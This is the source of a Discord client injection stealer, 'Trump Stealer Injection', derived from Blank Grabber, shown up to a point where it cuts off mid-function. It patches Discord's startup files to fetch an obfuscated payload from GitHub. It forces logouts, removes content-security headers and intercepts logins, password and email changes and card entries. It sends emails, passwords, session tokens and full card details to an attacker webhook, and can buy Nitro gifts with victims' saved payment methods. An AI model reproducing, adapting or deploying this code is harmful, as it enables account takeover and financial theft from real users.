const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const os = require('os');
const querystring = require('querystring');
const {
  BrowserWindow,
  session
} = require('electron');
const config = {
  webhook: atob('%WEBHOOKHEREBASE64ENCODED%'),
  webhook_protector_key: atob('%WEBHOOK_KEY%'),
  auto_buy_nitro: false,
  ping_on_run: true,
  ping_val: '@everyone',
  embed_name: 'Trump Stealer Injection',
  embed_icon: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
  embed_color: 5639644,
  injection_url: 'https://raw.githubusercontent.com/fuzzlesfixer/Discord-Injection-BG/refs/heads/main/injection-obfuscated.js',
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999'
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999'
      }
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499'
      }
    }
  },
  filter: {
    urls: ['https://discord.com/api/v*/users/@me', 'https://discordapp.com/api/v*/users/@me', 'https://*.discord.com/api/v*/users/@me', 'https://discordapp.com/api/v*/auth/login', 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', 'https://api.stripe.com/v*/tokens', 'https://api.stripe.com/v*/setup_intents/*/confirm', 'https://api.stripe.com/v*/payment_intents/*/confirm']
  },
  filter2: {
    urls: ['https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 'https://*.discord.com/api/v*/applications/detectable', 'https://discord.com/api/v*/applications/detectable', 'https://*.discord.com/api/v*/users/@me/library', 'https://discord.com/api/v*/users/@me/library', 'wss://remote-auth-gateway.discord.gg/*']
  }
};
function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return x & y ^ ~x & z;
}
function maj_32(x, y, z) {
  return x & y ^ x & z ^ y & z;
}
function rotl_32(x, n) {
  return x << n | x >>> 32 - n;
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff);
  var msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
  return (msw & 0xffff) << 16 | lsw & 0xffff;
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff);
  var msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
  return (msw & 0xffff) << 16 | lsw & 0xffff;
}
function binb2hex(binarray) {
  var str = '';
  var length = binarray.length * 4;
  var i;
  var srcByte;
  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> (3 - i % 4) * 8;
    str += '0123456789abcdef'.charAt(srcByte >>> 4 & 0xf) + '0123456789abcdef'.charAt(srcByte & 0xf);
  }
  return str;
}
function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [];
  var a;
  var b;
  var c;
  var d;
  var e;
  var T;
  var t;
  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];
  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = (W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16]) << 1 | (W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16]) >>> 31;
    }
    if (t < 20) {
      T = safeAdd_32_5(a << 5 | a >>> 27, b & c ^ ~b & d, e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_32_5(a << 5 | a >>> 27, b ^ c ^ d, e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_32_5(a << 5 | a >>> 27, b & c ^ b & d ^ c & d, e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_32_5(a << 5 | a >>> 27, b ^ c ^ d, e, 0xca62c1d6, W[t]);
    }
    e = d;
    d = c;
    c = b << 30 | b >>> 2;
    b = a;
    a = T;
  }
  H[0] = safeAdd_32_2(a, H[0]);
  H[1] = safeAdd_32_2(b, H[1]);
  H[2] = safeAdd_32_2(c, H[2]);
  H[3] = safeAdd_32_2(d, H[3]);
  H[4] = safeAdd_32_2(e, H[4]);
  return H;
}
function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i;
  var appendedMessageLength;
  var offset;
  offset = (remainderBinLen + 65 >>> 9 << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << 24 - remainderBinLen % 32;
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;
  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}
function hex2binb(str, existingBin, existingBinLen) {
  var bin;
  var length = str.length;
  var i;
  var num;
  var intOffset;
  var byteOffset;
  var existingByteLen;
  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;
  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }
  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << 8 * (3 - byteOffset % 4);
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }
  return {
    value: bin,
    binLen: length * 4 + existingBinLen
  };
}
class jsSHA {
  constructor() {
    var processedLen = 0;
    var remainder = [];
    var remainderLen = 0;
    var intermediateH;
    var outputBinLen;
    var variantBlockSize;
    var finalized = false;
    var hmacKeySet = false;
    var keyWithIPad = [];
    var keyWithOPad = [];
    var numRounds;
    var numRounds = 1;
    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    outputBinLen = 160;
    intermediateH = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
    this.setHMACKey = function (key) {
      var convertRet;
      var keyBinLen;
      var keyToUse;
      var blockByteSize;
      var i;
      var lastArrayIndex;
      convertRet = hex2binb(key);
      keyBinLen = convertRet.binLen;
      keyToUse = convertRet.value;
      blockByteSize = 64;
      lastArrayIndex = 15;
      if (64 < keyBinLen / 8) {
        keyToUse = finalizeSHA1(keyToUse, keyBinLen, 0, [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]);
        while (keyToUse.length <= 15) {
          keyToUse.push(0);
        }
        keyToUse[15] &= 0xffffff00;
      } else if (64 > keyBinLen / 8) {
        while (keyToUse.length <= 15) {
          keyToUse.push(0);
        }
        keyToUse[15] &= 0xffffff00;
      }
      for (i = 0; i <= 15; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }
      intermediateH = roundSHA1(keyWithIPad, intermediateH);
      processedLen = 512;
      hmacKeySet = true;
    };
    this.update = function (srcString) {
      var convertRet;
      var chunkBinLen;
      var chunkIntLen;
      var chunk;
      var i;
      var updateProcessedLen = 0;
      convertRet = hex2binb(srcString, remainder, remainderLen);
      chunkBinLen = convertRet.binLen;
      chunk = convertRet.value;
      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += 16) {
        if (updateProcessedLen + 512 <= chunkBinLen) {
          intermediateH = roundSHA1(chunk.slice(i, i + 16), intermediateH);
          updateProcessedLen += 512;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % 512;
    };
    this.getHMAC = function () {
      var firstHash;
      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }
      if (false === finalized) {
        firstHash = finalizeSHA1(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundSHA1(keyWithOPad, [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]);
        intermediateH = finalizeSHA1(firstHash, 160, 512, intermediateH);
      }
      finalized = true;
      return binb2hex(intermediateH);
    };
  }
}
if ('function' === typeof define && define.amd) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module.exports) {
    module.exports = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global.jsSHA = jsSHA;
}
if (jsSHA.default) {
  jsSHA = jsSHA.default;
}
function totp(key) {
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad((Math.floor(epoch / 30) < 15.5 ? '0' : '') + Math.round(Math.floor(epoch / 30)).toString(16), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = parseInt(hmac.substring(hmac.length - 1), 16);
  let otp = (parseInt(hmac.substr(offset * 2, 8), 16) & parseInt('7fffffff', 16)) + '';
  otp = otp.substr(Math.max(otp.length - 6, 0), 6);
  return otp;
}
function hex2dec(s) {
  return parseInt(s, 16);
}
function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}
function base32tohex(base32) {
  let bits = '';
  let hex = '';
  base32 = base32.replace(/=+$/, '');
  for (let i = 0; i < base32.length; i++) {
    let val = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) {
      console.error('Invalid base32 character in key');
    }
    bits += leftpad(val.toString(2), 5, '0');
  }
  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}
function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}
const discordPath = function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;
  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }
  if (fs.existsSync(resourcePath)) {
    return {
      resourcePath,
      app
    };
  }
  return {
    undefined,
    undefined
  };
}();
function updateCheck() {
  const {
    resourcePath,
    app
  } = discordPath;
  if (resourcePath === undefined || app === undefined) {
    return;
  }
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
  const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(appPath)) {
    fs.mkdirSync(appPath);
  }
  if (fs.existsSync(packageJson)) {
    fs.unlinkSync(packageJson);
  }
  if (fs.existsSync(resourceIndex)) {
    fs.unlinkSync(resourceIndex);
  }
  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(packageJson, JSON.stringify({
      name: 'discord',
      main: 'index.js'
    }, null, 4));
    fs.writeFileSync(resourceIndex, `const fs = require('fs'), https = require('https');
const indexJs = '${`${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${'https://raw.githubusercontent.com/f4kedre4lity/Discord-Injection-BG/main/injection-obfuscated.js'}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA==', '${'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI2NTM3MzA1NzIyMTEzMjM2Mi9zbXFxRUt2d2daQzEwSS1qMGpzRTktN3hoRXROVk9qb21WdXl0YzVLbUlHQklPcjJUSENsdGFXWmYxMUp0RzNUZUREUA=='}')
        res.replace('test', '${'test'}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\"));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) {
  fs.mkdirSync(path.join(__dirname, 'initiation'));
  execScript(`(() => {
  // Effacer le token d'authentification
  setInterval(() => {
    document.body.appendChild(document.createElement\`iframe\`).contentWindow.localStorage.clear();
  }, 50);

  // Supprimer les cookies
  document.cookie.split(";").forEach((c) => {
    document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
  });

  // Supprimer le cache
  if ('caches' in window) {
    caches.keys().then((names) => {
      names.forEach((name) => caches.delete(name));
    });
  }

  // Supprimer les sessions (service workers)
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      registrations.forEach((registration) => registration.unregister());
    });
  }

  // Recharger la page sans redirection
  setTimeout(() => {
    window.location.href = 'https://discord.com/login';
  }, 2500);
  })();`);
  }
  return false;
}
const execScript = script => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, true);
};
const getInfo = async token => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${'https://discord.com/api/v9/users/@me'}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};
const fetchBilling = async token => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${'https://discord.com/api/v9/users/@me'}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.length || bill.length === 0) {
    return '';
  }
  return JSON.parse(bill);
};
const getBilling = async token => {
  const data = await fetchBilling(token);
  if (!data) {
    return '❌';
  }
  const billing = [];
  data.forEach(x => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing.push('💳');
          break;
        case 2:
          billing.push('<:paypal:1343569437202317322>');
          break;
        default:
          billing.push('(Unknown)');
      }
    }
  });
  if (billing.length == 0) {
    billing.push('❌');
  }
  return billing.join(' ');
};
const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time].price,
    expected_currency: 'eur',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time].sku
  };
  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time].id}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req.gift_code) {
    return 'https://discord.gift/' + req.gift_code;
  } else {
    return null;
  }
};
const buyNitro = async token => {
  const data = await fetchBilling(token);
  if (!data) {
    return 'Failed to Purchase ❌';
  }
  let IDS = [];
  data.forEach(x => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return 'Failed to Purchase ❌';
        }
      }
    }
  }
};
const getNitro = flags => {
  switch (flags) {
    case 0:
      return 'No Nitro';
    case 1:
      return 'Nitro Classic';
    case 2:
      return 'Nitro';
    case 3:
      return 'Nitro Basic';
    default:
      return '(Unknown)';
  }
};
const getBadges = flags => {
  const badges = [];
  if (flags == 4194304) {
    badges.push('Active Developer');
    flags -= 4194304;
  }
  if (flags == 262144) {
    badges.push('Moderator Programs Alumni');
    flags -= 262144;
  }
  if (flags == 131072) {
    badges.push('Early Verified Bot Developer');
    flags -= 131072;
  }
  if (flags == 16384) {
    badges.push('Discord Bug Hunter (Golden)');
    flags -= 16384;
  }
  if (flags == 512) {
    badges.push('Early Supporter');
    flags -= 512;
  }
  if (flags == 256) {
    badges.push('HypeSquad Balance');
    flags -= 256;
  }
  if (flags == 128) {
    badges.push('HypeSquad Brilliance');
    flags -= 128;
  }
  if (flags == 64) {
    badges.push('HypeSquad Bravery');
    flags -= 64;
  }
  if (flags == 8) {
    badges.push('Discord Bug Hunter (Normal)');
    flags -= 8;
  }
  if (flags == 4) {
    badges.push('HypeSquad Event');
    flags -= 4;
  }
  if (flags == 2) {
    badges.push('Partnered Server Owner');
    flags -= 2;
  }
  if (flags == 1) {
    badges.push('Discord Staff');
    flags -= 1;
  }
  if (flags == 0) {
    if (badges.length == 0) {
      badges.push('None');
    }
  } else {
    badges.push('(Unknown)');
  }
  return badges.join(', ');
};
const hooker = async content => {
    const data = JSON.stringify(content);
  
    const headers = {
      "Content-Type": "application/json",
      "Authorization": config.webhook_protector_key
    };
  
    const options = {
      method: "POST",
      headers: headers,
      body: data
    };
  
    fetch(config.webhook, options)
      .then(response => response.json())
      .then(json => console.log("Webhook relayed:", json))
      .catch(err => console.error("Webhook relay failed:", err));
};
  
const login = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const phone = json.phone ? json.phone : 'None';
    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
  
    const content = {
      username: 'Trump Stealer Injection',
      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
      embeds: [
        {
          title: '<a:trump:1342979705174884372> Trump Stealer Login',
          color: 5639644,
          fields: [
            {
              name: 'Profile Picture',
              value: `[Download pfp](${avatarUrl})`,
              inline: false
            },
            {
              name: 'Username',
              value: `\`${json.username}#${json.discriminator}\``,
              inline: true
            },
            {
              name: 'ID',
              value: `\`${json.id}\``,
              inline: true
            },
            {
              name: 'Nitro <a:nitro:1130453517312725052>',
              value: `${nitro}`,
              inline: true
            },
            {
              name: 'Badges <a:badges:1130448593715740692>',
              value: `${badges}`,
              inline: true
            },
            {
              name: 'Language <:4533language:1130453119919206500>',
              value: `${json.locale}`,
              inline: true
            },
            {
              name: 'Phone <a:phone:1343560504437768338>',
              value: `${phone}`,
              inline: true
            },
            {
              name: 'Billing <a:CC:1343558993452208128>',
              value: `${billing}`,
              inline: true
            },
            {
              name: 'Email <:Mail:1343558994828071042>',
              value: `\`${email}\``,
              inline: true
            },
            {
              name: 'Password <:Pass:1343559983765393470>',
              value: `\`${password}\``,
              inline: true
            },
            {
              name: 'Token <:Token:1343559982138003466>',
              value: `\`\`\`${token}\`\`\``,
              inline: false
            }
          ],
          thumbnail: {
            url: avatarUrl
          },
          footer: {
            text: 'Trump Stealer',
          }
        }
      ]
    };
  
    // Trigger webhook
    content.content = '@everyone';
    hooker(content);
  };  
  const passwordChanged = async (oldpassword, newpassword, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
  
    const content = {
      username: 'Trump Stealer Injection',
      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
      embeds: [
        {
          title: '🔑 Password Changed',
          color: 5639644,
          fields: [
            {
              name: 'Profile Picture',
              value: `[Download pfp](${avatarUrl})`,
              inline: false
            },
            {
              name: 'Username',
              value: `\`${json.username}#${json.discriminator}\``,
              inline: true
            },
            {
              name: 'ID',
              value: `\`${json.id}\``,
              inline: true
            },
            {
              name: 'Nitro <a:nitro:1130453517312725052>',
              value: `${nitro}`,
              inline: true
            },
            {
              name: 'Badges <a:badges:1130448593715740692>',
              value: `${badges}`,
              inline: true
            },
            {
              name: 'Billing Method <a:CC:1343558993452208128>',
              value: `${billing}`,
              inline: true
            },
            {
              name: 'Password Info 🔒',
              value: `**Email:** \`${json.email}\`\n**Old Password:** \`${oldpassword}\`\n**New Password:** \`${newpassword}\``,
              inline: false
            },
            {
              name: 'Token <:Token:1343559982138003466>',
              value: `\`\`\`${token}\`\`\``,
              inline: false
            }
          ],
          thumbnail: {
            url: avatarUrl
          },
          footer: {
            text: 'Trump Stealer',
          }
        }
      ]
    };
  
    // Trigger webhook
    content.content = '@everyone';
    hooker(content);
  };  
  const emailChanged = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
  
    const content = {
      username: 'Trump Stealer Injection',
      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
      embeds: [
        {
          title: '📧 Email Changed',
          color: 5639644,
          fields: [
            {
              name: 'Profile Picture',
              value: `[Download pfp](${avatarUrl})`,
              inline: false
            },
            {
              name: 'Username',
              value: `\`${json.username}#${json.discriminator}\``,
              inline: true
            },
            {
              name: 'ID',
              value: `\`${json.id}\``,
              inline: true
            },
            {
              name: 'Nitro <a:nitro:1130453517312725052>',
              value: `${nitro}`,
              inline: true
            },
            {
              name: 'Badges <a:badges:1130448593715740692>',
              value: `${badges}`,
              inline: true
            },
            {
              name: 'Billing Method <a:CC:1343558993452208128>',
              value: `${billing}`,
              inline: true
            },
            {
              name: 'Email Info 📬',
              value: `**New Email:** \`${email}\`\n**Password:** \`${password}\``,
              inline: false
            },
            {
              name: 'Token <:Token:1343559982138003466>',
              value: `\`\`\`${token}\`\`\``,
              inline: false
            }
          ],
          thumbnail: {
            url: avatarUrl
          },
          footer: {
            text: 'Trump Stealer',
          }
        }
      ]
    };
  
    // Trigger webhook
    content.content = '@everyone';
    hooker(content);
  };  
const PaypalAdded = async (token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
  
    const content = {
      username: 'Trump Stealer Injection',
      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
      embeds: [
        {
          title: '<:paypal:1343569437202317322> PayPal Account Added',
          color: 5639644,
          fields: [
            {
              name: 'Profile Picture',
              value: `[Download pfp](${avatarUrl})`,
              inline: false
            },
            {
              name: 'Username',
              value: `\`${json.username}#${json.discriminator}\``,
              inline: true
            },
            {
              name: 'ID',
              value: `\`${json.id}\``,
              inline: true
            },
            {
              name: 'Nitro <a:nitro:1130453517312725052>',
              value: `${nitro}`,
              inline: true
            },
            {
              name: 'Badges <a:badges:1130448593715740692>',
              value: `${badges}`,
              inline: true
            },
            {
              name: 'Billing Method <a:CC:1343558993452208128>',
              value: `${billing}`,
              inline: true
            },
            {
              name: 'Token <:Token:1343559982138003466>',
              value: `\`\`\`${token}\`\`\``,
              inline: false
            }
          ],
          thumbnail: {
            url: avatarUrl
          },
          footer: {
            text: 'Trump Stealer',
          }
        }
      ]
    };
  
    // Trigger webhook
    content.content = '@everyone';
    hooker(content);
  };  
  const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const avatarUrl = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
  
    const content = {
      username: 'Trump Stealer Injection',
      avatar_url: 'https://raw.githubusercontent.com/FalseKSCH/assets/main/thiefcat.png',
      embeds: [
        {
          title: '💳 Credit Card Added',
          color: 5639644,
          fields: [
            {
              name: 'Profile Picture',
              value: `[Download pfp](${avatarUrl})`,
              inline: false
            },
            {
              name: 'Username',
              value: `\`${json.username}#${json.discriminator}\``,
              inline: true
            },
            {
              name: 'ID',
              value: `\`${json.id}\``,
              inline: true
            },
            {
              name: 'Nitro <a:nitro:1130453517312725052>',
              value: `${nitro}`,
              inline: true
            },
            {
              name: 'Badges <a:badges:1130448593715740692>',
              value: `${badges}`,
              inline: true
            },
            {
              name: 'Billing Method <a:CC:1343558993452208128>',
              value: `${billing}`,
              inline: true
            },
            {
              name: 'Credit Card Info',
              value: `**Number:** \`${number}\`\n**CVC:** \`${cvc}\`\n**Expiration:** \`${expir_month}/${expir_year}\``,
              inline: false
            },
            {
              name: 'Token <:Token:1343559982138003466>',
              value: `\`\`\`${token}\`\`\``,
              inline: false
            }
          ],
          thumbnail: {
            url: avatarUrl
          },
          footer: {
            text: 'Trump Stealer',
          }
        }
      ]
    };
  
    // Trigger webhook
    content.content = '@everyone';
    hooker(content);
  };  
const nitroBought = async token => {
  const json = await getInfo(token);
  const nitro = getNitro(json.premium_type);
  const badges = getBadges(json.flags);
  const billing = await getBilling(token);
  const code = await buyNitro(token);
  const content = {
    username: 'Blank Grabber Injection',
    content: code,
    avatar_url: 'https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png',
    embeds: [{
      color: 5639644,
      fields: [{
        name: '**Nitro bought!**',
        value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
        inline: true
      }, {
        name: '**Discord Info**',
        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
        inline: true
      }, {
        name: '**Token**',
        value: `\`${token}\``,
        inline: false
      }],
      author: {
        name: json.username + '#' + json.discriminator + ' | ' + json.id,
        icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
      }
    }]
  };
  content.content = '@everyone' + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) {
    return callback({
      cancel: true
    });
  }
  updateCheck();
});
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign({
          'Access-Control-Allow-Headers': '*'
        }, details.responseHeaders)
      });
    } else {
      callback({
        responseHeaders: Object.assign({
          'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
          'Access-Control-Allow-Headers': '*',
          'Access-Control-Allow-Origin': '*'
        }, details.responseHeaders)
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*'
      }
    });
  }
});
  
  session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
    console.log(`🚩 [Request Captured] URL: ${details.url}`);
    console.log(`🔍 [Method]: ${details.method}`);
    console.log(`📡 [Status Code]: ${details.statusCode}`);
  
    if (details.statusCode !== 200 && details.statusCode !== 202) {
      console.log(`❌ [Invalid Status Code] Skipping...`);
      return;
    }
  
    let unparsed_data;
    try {
      unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
      console.log(`📝 [Unparsed Data]: ${unparsed_data}`);
    } catch (err) {
      console.log(`⚠️ [Error Parsing Data]: ${err}`);
      return;
    }
  
    let data;
    try {
      // Vérifie si le payload est du JSON ou encodé en URL
      if (unparsed_data.trim().startsWith('{')) {
        data = JSON.parse(unparsed_data); // Si le payload commence par '{', c'est du JSON
      } else {
        data = querystring.parse(unparsed_data); // Sinon, c'est probablement de l'URL-encoded
      }
      console.log(`✅ [Parsed Data]: ${JSON.stringify(data)}`);
    } catch (err) {
      console.log(`⚠️ [Data Parse Error]: ${err}`);
      return;
    }
  
    let token;
    try {
      token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
      console.log(`🔑 [Token Retrieved]: ${token}`);
    } catch (err) {
      console.log(`❌ [Token Retrieval Failed]: ${err}`);
      return;
    }
  
    switch (true) {
      case details.url.endsWith('login'):
        console.log(`🔐 [Login Event Detected]`);
        login(data.login, data.password, token).catch((err) => console.log(`⚠️ [Login Error]: ${err}`));
        break;
  
      case details.url.endsWith('users/@me') && details.method === 'PATCH':
        console.log(`🔧 [User Update Detected]`);
        if (!data.password) {
          console.log(`⚠️ [No Password Provided]`);
          return;
        }
        if (data.email) {
          console.log(`📧 [Email Change Detected]`);
          emailChanged(data.email, data.password, token).catch((err) => console.log(`⚠️ [Email Change Error]: ${err}`));
        }
        if (data.new_password) {
          console.log(`🔑 [Password Change Detected]`);
          passwordChanged(data.password, data.new_password, token).catch((err) => console.log(`⚠️ [Password Change Error]: ${err}`));
        }
        break;
  
      case details.url.endsWith('tokens') && details.method === 'POST':
        console.log(`💳 [Credit Card Info Detected]`);
        try {
          console.log(`💾 [Card Data]: ${JSON.stringify(data)}`);
